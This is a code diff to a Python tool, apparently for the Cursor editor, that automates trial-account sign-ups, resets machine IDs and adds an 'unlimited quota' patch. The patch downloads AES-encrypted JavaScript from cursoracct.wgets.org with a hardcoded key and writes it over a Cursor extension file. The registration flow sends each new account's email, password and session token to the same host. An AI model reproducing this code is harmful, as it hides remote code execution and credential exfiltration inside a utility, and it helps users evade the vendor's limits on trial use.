@@ -5,6 +5,7 @@ import sys
 from colorama import Fore, Style
 from enum import Enum
 from typing import Optional
+import webbrowser  # 添加到文件顶部的导入部分
 
 from exit_cursor import ExitCursor
 import go_cursor_help
@@ -24,9 +25,23 @@ from get_email_code import EmailVerificationHandler
 from logo import print_logo
 from config import Config
 from datetime import datetime
+import base64
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import gzip
 
 # 定义 EMOJI 字典
 EMOJI = {"ERROR": "❌", "WARNING": "⚠️", "INFO": "ℹ️"}
+
+# 添加常量
+API_HOST = "https://cursoracct.wgets.org"
+AES_KEY = "04eb155c79214c869be5d83d3f3c28dc"
+
+class User:
+    def __init__(self, username="", password="", token=""):
+        self.username = username
+        self.password = password
+        self.token = token
 
 
 class VerificationStatus(Enum):
@@ -151,7 +166,7 @@ def handle_turnstile(tab, max_retries: int = 2, retry_interval: tuple = (1, 2)) 
         # 超出最大重试次数
         logging.error(f"验证失败 - 已达到最大重试次数 {max_retries}")
         logging.error(
-            "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
+            "请前往开源项目查看更多信息："+API_HOST
         )
         save_screenshot(tab, "failed")
         return False
@@ -303,7 +318,7 @@ def sign_up_account(browser, tab):
             total_usage = usage_info.split("/")[-1].strip()
             logging.info(f"账户可用额度上限: {total_usage}")
             logging.info(
-                "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
+                "请前往开源项目查看更多信息："+API_HOST
             )
     except Exception as e:
         logging.error(f"获取账户额度信息失败: {str(e)}")
@@ -386,127 +401,389 @@ def reset_machine_id(greater_than_0_45):
         MachineIDResetter().reset_machine_ids()
 
 
-def print_end_message():
-    logging.info("\n\n\n\n\n")
-    logging.info("=" * 30)
-    logging.info("所有操作已完成")
-    logging.info("\n=== 获取更多信息 ===")
-    logging.info("🔥 QQ交流群: 1034718338")
-    logging.info("📺 B站UP主: 想回家的前端")
-    logging.info("=" * 30)
-    logging.info(
-        "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
-    )
+def disable_auto_update():
+    """禁用Cursor自动更新功能"""
+    try:
+        pkg_path, main_path = patch_cursor_get_machine_id.get_cursor_paths()
+        main_js_path = os.path.join(os.path.dirname(pkg_path), "out", "main.js")
+        if not os.path.exists(main_js_path):
+            logging.error("未找到main.js文件，无法禁用自动更新")
+            return False
+            
+        with open(main_js_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+            
+            # 替换更新检查逻辑
+            updated_content = content.replace('!!this.args["disable-updates"]', 'true')
+            
+            with open(main_js_path, 'w', encoding='utf-8') as f:
+                f.write(updated_content)
+            
+            logging.info("已成功禁用Cursor自动更新")
+            return True
+    except Exception as e:
+        logging.error(f"禁用自动更新失败: {str(e)}")
+        return False
+
+
+def login(user):
+    """登录函数"""
+    try:
+        logging.info("正在尝试登录...")
+        url = f"{API_HOST}/api/login?username={user.username}&password={user.password}&t={int(time.time() * 1000)}"
+        
+        response = requests.get(url)
+        if response.status_code >= 400:
+            logging.error(f"HTTP错误: {response.status_code}")
+            return False
+            
+        data = response.json()
+        if data.get("token"):
+            user.token = data["token"]
+            return True
+            
+        logging.error(f"登录错误: {data.get('error', '未知错误')}")
+        return False
+        
+    except Exception as e:
+        logging.error(f"登录失败: {str(e)}")
+        return False
+
+
+def get_main_js_from_network(token):
+    """从网络获取main.js文件"""
+    try:
+        url = f"{API_HOST}/api/ts?t={int(time.time() * 1000)}"
+        headers = {"Authorization": f"Bearer {token}"} if token else {}
+        
+        response = requests.get(url, headers=headers)
+        if response.status_code >= 400:
+            logging.error(f"获取main.js失败，状态码: {response.status_code}")
+            return None
+            
+        try:
+            data = response.json().get('data')
+            if not data:
+                logging.error("响应数据格式错误")
+                return None
+            return data
+        except ValueError:
+            logging.error("解析JSON响应失败")
+            return None
+            
+    except Exception as e:
+        logging.error(f"网络请求失败: {str(e)}")
+        return None
+
+
+def decrypt_main_js(encrypted_data):
+    """解密main.js文件内容"""
+    try:
+        # Base64解码
+        base64_decoded = base64.b64decode(encrypted_data)
+        
+        # AES解密
+        key = bytes(AES_KEY, 'utf-8')  # 使用正确的密钥
+        iv = key[:16]  # 使用密钥的前16位作为IV
+        
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted_data = decryptor.update(base64_decoded) + decryptor.finalize()
+        
+        # 移除PKCS7填充
+        if len(decrypted_data) == 0:
+            raise ValueError("解密后数据为空")
+            
+        padding_length = decrypted_data[-1]
+        if padding_length > len(decrypted_data):
+            raise ValueError("无效的填充长度")
+            
+        decrypted_data = decrypted_data[:-padding_length]
+        
+        # GZIP解压
+        try:
+            decompressed_data = gzip.decompress(decrypted_data)
+            return decompressed_data.decode('utf-8')
+        except Exception as gz_error:
+            logging.error(f"GZIP解压失败: {str(gz_error)}")
+            # 打印一些调试信息
+            logging.debug(f"解密数据前16字节: {decrypted_data[:16]}")
+            return None
+        
+    except Exception as e:
+        logging.error(f"解密过程失败: {str(e)}")
+        return None
+
+
+def get_gateway_path():
+    """获取网关文件路径"""
+    try:
+        # 判断操作系统
+        if sys.platform == "win32":  # Windows
+            home = os.path.expanduser("~")
+            gateway_path = os.path.join(
+                home,
+                "AppData",
+                "Local", 
+                "Programs", 
+                "cursor", 
+                "resources",
+                "app", 
+                "extensions", 
+                "cursor-always-local", 
+                "dist",
+                "main.js"
+            )
+        elif sys.platform == "darwin":  # macOS
+            gateway_path = os.path.abspath(os.path.expanduser(
+                "/Applications/Cursor.app/Contents/Resources/app/extensions/cursor-always-local/dist/main.js"
+            ))
+        else:
+            raise OSError("不支持的操作系统")
+            
+        if not os.path.exists(gateway_path):
+            raise FileNotFoundError("未找到网关文件，请确认Cursor安装正确")
+            
+        return gateway_path
+    except Exception as e:
+        logging.error(f"获取网关路径失败: {str(e)}")
+        return None
+
+
+def apply_gateway_patch():
+    """应用无限额度网关补丁"""
+    try:
+        # 获取用户登录信息
+        username = input("请输入用户名: ").strip()
+        password = input("请输入密码: ").strip()
+        
+        user = User(username=username, password=password)
+        
+        # 尝试登录
+        logging.info("正在登录...")
+        if not login(user):
+            logging.error("登录失败，无法应用补丁")
+            return False
+            
+        # 获取网关文件
+        logging.info("正在从网络获取最新网关文件...")
+        encrypted_js = get_main_js_from_network(user.token)
+        if not encrypted_js:
+            logging.error("获取网关文件失败")
+            return False
+            
+        logging.info("正在解密网关文件...")
+        decrypted_js = decrypt_main_js(encrypted_js)
+        if not decrypted_js:
+            logging.error("解密网关文件失败")
+            return False
+            
+        # 获取目标文件路径
+        gateway_path = get_gateway_path()
+        if not gateway_path:
+            return False
+            
+        # 备份原文件
+        backup_path = f"{gateway_path}.bak"
+        if not os.path.exists(backup_path):
+            try:
+                import shutil
+                shutil.copy2(gateway_path, backup_path)
+                logging.info("已创建原文件备份")
+            except Exception as e:
+                logging.error(f"创建备份失败: {str(e)}")
+                return False
+        
+        # 替换账号信息并写入文件
+        try:
+            # 使用token替换test:123456
+            updated_content = decrypted_js.replace('test:123456', user.token)
+            
+            with open(gateway_path, 'w', encoding='utf-8') as f:
+                f.write(updated_content)
+                
+            logging.info("网关补丁应用成功")
+            return True
+        except Exception as e:
+            logging.error(f"写入文件失败: {str(e)}")
+            return False
+            
+    except Exception as e:
+        logging.error(f"应用网关补丁失败: {str(e)}")
+        return False
+
+
+def restore_gateway():
+    """还原网关文件"""
+    try:
+        gateway_path = get_gateway_path()
+        if not gateway_path:
+            return False
+            
+        backup_path = f"{gateway_path}.bak"
+        if not os.path.exists(backup_path):
+            logging.error("未找到备份文件，无法还原")
+            return False
+            
+        try:
+            # 删除当前的main.js
+            os.remove(gateway_path)
+            logging.info("已删除当前网关文件")
+            
+            # 将backup文件重命名为main.js
+            os.rename(backup_path, gateway_path)
+            logging.info("网关文件已还原成功")
+            return True
+            
+        except Exception as e:
+            logging.error(f"还原文件失败: {str(e)}")
+            return False
+            
+    except Exception as e:
+        logging.error(f"还原网关失败: {str(e)}")
+        return False
+
+
+def show_menu():
+    """显示操作菜单"""
+    print("\n=== Cursor 配置工具 ===")
+    print("0. 打开官网地址: "+API_HOST)
+    print("1. 重置机器码")
+    print("2. 自动注册账号")
+    print("3. 禁用自动更新")
+    print("4. 无限额度网关补丁")
+    print("5. 还原网关文件")
+    print("6. 退出程序")
+    print("=" * 30)
 
 
 if __name__ == "__main__":
     print_logo()
     greater_than_0_45 = check_cursor_version()
     browser_manager = None
+    
     try:
         logging.info("\n=== 初始化程序 ===")
         ExitCursor()
 
-        # 提示用户选择操作模式
-        print("\n请选择操作模式:")
-        print("1. 仅重置机器码")
-        print("2. 完整注册流程")
-
         while True:
+            show_menu()
             try:
-                choice = int(input("请输入选项 (1 或 2): ").strip())
-                if choice in [1, 2]:
+                choice = int(input("请输入选项 (0-6): ").strip())
+                if choice not in [0, 1, 2, 3, 4, 5, 6]:
+                    print("无效的选项，请重新输入")
+                    continue
+                    
+                if choice == 0:
+                    logging.info("正在打开官网...")
+                    webbrowser.open(API_HOST)
+                    continue
+                    
+                if choice == 6:
+                    logging.info("程序退出")
                     break
-                else:
-                    print("无效的选项,请重新输入")
+                    
+                if choice == 3:
+                    if disable_auto_update():
+                        logging.info("自动更新已禁用，请重启Cursor")
+                    continue
+                    
+                if choice == 4:
+                    if apply_gateway_patch():
+                        logging.info("网关补丁已应用，请重启Cursor")
+                    continue
+                    
+                if choice == 5:
+                    if restore_gateway():
+                        logging.info("网关已还原，请重启Cursor")
+                    continue
+                    
+                if choice == 1:
+                    # 仅执行重置机器码
+                    reset_machine_id(greater_than_0_45)
+                    logging.info("机器码重置完成")
+                    continue
+
+                # choice == 2 的情况，执行完整注册流程
+                logging.info("正在初始化浏览器...")
+                
+                # 获取user_agent
+                user_agent = get_user_agent()
+                if not user_agent:
+                    logging.error("获取user agent失败，使用默认值")
+                    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+                # 剔除user_agent中的"HeadlessChrome"
+                user_agent = user_agent.replace("HeadlessChrome", "Chrome")
+
+                browser_manager = BrowserManager()
+                browser = browser_manager.init_browser(user_agent)
+
+                # 获取并打印浏览器的user-agent
+                user_agent = browser.latest_tab.run_js("return navigator.userAgent")
+
+                logging.info("正在初始化邮箱验证模块...")
+                email_handler = EmailVerificationHandler()
+                logging.info(
+                    "请前往开源项目查看更多信息："+API_HOST
+                )
+                logging.info("\n=== 配置信息 ===")
+                login_url = "https://authenticator.cursor.sh"
+                sign_up_url = "https://authenticator.cursor.sh/sign-up"
+                settings_url = "https://www.cursor.com/settings"
+                mail_url = "https://tempmail.plus"
+
+                logging.info("正在生成随机账号信息...")
+                email_generator = EmailGenerator()
+                account = email_generator.generate_email()
+                password = email_generator.default_password
+                first_name = email_generator.default_first_name
+                last_name = email_generator.default_last_name
+
+                logging.info(f"生成的邮箱账号: {account}")
+                auto_update_cursor_auth = True
+
+                tab = browser.latest_tab
+
+                tab.run_js("try { turnstile.reset() } catch(e) { }")
+
+                logging.info("\n=== 开始注册流程 ===")
+                logging.info(f"正在访问登录页面: {login_url}")
+                tab.get(login_url)
+
+                if sign_up_account(browser, tab):
+                    logging.info("正在获取会话令牌...")
+                    token = get_cursor_session_token(tab)
+                    if token:
+                        logging.info("更新认证信息...")
+                        update_cursor_auth(
+                            email=account, access_token=token, refresh_token=token
+                        )
+                        logging.info(
+                            "请前往开源项目查看更多信息："+API_HOST
+                        )
+                        logging.info("重置机器码...")
+                        reset_machine_id(greater_than_0_45)
+                        htps_request = requests.post(
+                            url=API_HOST+"/addToken",
+                            json={
+                                "email": account,
+                                "password": password,
+                                "first_name": first_name,
+                                "last_name": last_name,
+                                "token": token,
+                            }
+                        )
+                        logging.info("所有操作已完成")
+                    else:
+                        logging.error("获取会话令牌失败，注册流程未完成")
+
             except ValueError:
                 print("请输入有效的数字")
-
-        if choice == 1:
-            # 仅执行重置机器码
-            reset_machine_id(greater_than_0_45)
-            logging.info("机器码重置完成")
-            print_end_message()
-            sys.exit(0)
-
-        logging.info("正在初始化浏览器...")
-
-        # 获取user_agent
-        user_agent = get_user_agent()
-        if not user_agent:
-            logging.error("获取user agent失败，使用默认值")
-            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-
-        # 剔除user_agent中的"HeadlessChrome"
-        user_agent = user_agent.replace("HeadlessChrome", "Chrome")
-
-        browser_manager = BrowserManager()
-        browser = browser_manager.init_browser(user_agent)
-
-        # 获取并打印浏览器的user-agent
-        user_agent = browser.latest_tab.run_js("return navigator.userAgent")
-
-        logging.info("正在初始化邮箱验证模块...")
-        email_handler = EmailVerificationHandler()
-        logging.info(
-            "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
-        )
-        logging.info("\n=== 配置信息 ===")
-        login_url = "https://authenticator.cursor.sh"
-        sign_up_url = "https://authenticator.cursor.sh/sign-up"
-        settings_url = "https://www.cursor.com/settings"
-        mail_url = "https://tempmail.plus"
-
-        logging.info("正在生成随机账号信息...")
-        email_generator = EmailGenerator()
-        account = email_generator.generate_email()
-        password = email_generator.default_password
-        first_name = email_generator.default_first_name
-        last_name = email_generator.default_last_name
-
-        logging.info(f"生成的邮箱账号: {account}")
-        auto_update_cursor_auth = True
-
-        tab = browser.latest_tab
-
-        tab.run_js("try { turnstile.reset() } catch(e) { }")
-
-        logging.info("\n=== 开始注册流程 ===")
-        logging.info(f"正在访问登录页面: {login_url}")
-        tab.get(login_url)
-
-        if sign_up_account(browser, tab):
-            logging.info("正在获取会话令牌...")
-            token = get_cursor_session_token(tab)
-            if token:
-                logging.info("更新认证信息...")
-                update_cursor_auth(
-                    email=account, access_token=token, refresh_token=token
-                )
-                logging.info(
-                    "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
-                )
-                logging.info("重置机器码...")
-                reset_machine_id(greater_than_0_45)
-                htps_request = requests.post(
-                    url="https://cursoracct.wgets.org/addToken",
-                    json={
-                        "email": account,
-                        "password": password,
-                        "first_name": first_name,
-                        "last_name": last_name,
-                        "token": token,
-                    }
-                )
-                logging.info("所有操作已完成")
-                print_end_message()
-            else:
-                logging.error("获取会话令牌失败，注册流程未完成")
 
     except Exception as e:
         logging.error(f"程序执行出现错误: {str(e)}")
         import traceback
-
         logging.error(traceback.format_exc())
     finally:
         if browser_manager:
